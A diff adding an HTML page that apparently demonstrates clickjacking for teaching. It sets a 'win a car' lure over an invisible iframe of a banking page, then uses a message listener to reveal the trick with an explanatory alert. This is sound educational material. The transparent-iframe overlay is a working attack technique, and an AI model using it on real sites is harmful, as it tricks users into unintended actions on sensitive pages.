@@ -1,0 +1,60 @@
+<html>
+  <head>
+    <link rel="icon" href="data:;base64,iVBORw0KGgo=">
+    <style>
+      a {
+        font-size: 3em;
+      }
+
+      #content {
+        display: flex;
+        flex-direction: row;
+        width: 100%;
+      }
+
+      #content div {
+        width: 50%;
+      }
+
+      iframe {
+        width: 95%;
+        height: 95%;
+        position: absolute;
+        opacity: 0;
+        overflow:hidden;
+      }
+    </style>
+  </head>
+<body>
+  <iframe src="/bank.html__QUERY__"></iframe
+  <div>
+    <h1>
+      You could be the lucky winner of a brand-new car!
+    </h1>
+  </div>
+  <div id="content">
+    <div>
+      <img src="/hummer.png" width="600" />
+    </div>
+    <div>
+      <a href="/fail-hack">Click here to win!</a>
+    </div>
+  </div>
+  <script type="text/javascript">
+  	var eventMethod = window.addEventListener
+  			? "addEventListener"
+  			: "attachEvent";
+  	var eventer = window[eventMethod];
+  	var messageEvent = eventMethod === "attachEvent"
+  		? "onmessage"
+  		: "message";
+  	eventer(messageEvent, function (e) {
+  		if (e.data === "hijacked" || e.message === "hijacked") {
+        alert(`You just thought of buying a hummer but instead clicked on a banking website. To let you understand the mechanics of this attack, let me tweak te opacity of the banking page, which is embedded through an iframe`)
+        console.log(document.querySelector('iframe').style.opacity)
+        document.querySelector('iframe').style.opacity = 0.1 + document.querySelector('iframe').style.opacity * 2;
+      }
+  	});
+  </script>
+</body>
+</html>
